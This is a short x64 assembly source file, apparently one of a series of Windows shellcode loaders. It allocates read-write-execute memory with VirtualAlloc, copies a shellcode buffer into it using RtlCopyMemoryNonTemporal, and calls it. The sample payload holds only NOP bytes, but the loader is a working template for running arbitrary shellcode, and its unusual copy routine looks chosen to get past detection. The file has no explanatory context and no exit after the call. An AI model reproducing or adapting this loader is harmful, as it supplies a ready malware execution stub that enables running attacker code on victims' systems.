; windows_loader64bits_rtlcopymemorynontemporal.asm

extrn VirtualAlloc :PROC
extrn GetCurrentProcess :PROC
extrn RtlCopyMemoryNonTemporal :PROC

.data
    shellcode   DB 90h, 90h, 90h, 90h, 90h, 0
    baseAddr    DQ ?

.code
Start PROC
    SUB     rsp, 28h

    XOR     rcx, rcx
    MOV     rdx, 100h
    MOV     r8, 1000h ; MEM_COMMIT
    MOV     r9, 40h ; PAGE_EXECUTE_READWRITE
    CALL    VirtualAlloc
    MOV     baseAddr, rax

    MOV     rcx, baseAddr
    LEA     rdx, shellcode
    MOV     r8, SIZEOF shellcode
    CALL    RtlCopyMemoryNonTemporal

    CALL    baseAddr

Start ENDP
END